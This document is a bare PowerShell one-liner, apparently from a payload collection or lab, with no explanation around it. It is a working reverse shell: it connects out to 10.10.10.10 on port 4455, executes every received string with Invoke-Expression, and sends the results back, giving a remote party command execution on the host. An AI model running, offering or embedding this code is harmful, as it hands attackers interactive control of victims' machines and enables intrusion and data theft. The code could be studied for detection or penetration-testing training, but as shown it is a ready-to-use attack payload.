$h="10.10.10.10";$p=4455;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$b=New-Object System.Byte[] 1024;while($c.Connected){while($s.DataAvailable){$d=$s.Read($b,0,$b.Length);$e=([text.encoding]::UTF8).GetString($b,0,$d-1)}if($c.Connected -and $e.Length -gt 1){$o=try{Invoke-Expression $e 2>&1}catch{$_};$w.Write("$o`n");$e=$null}}$c.Close();$s.Close();$r.Close();$w.Close()
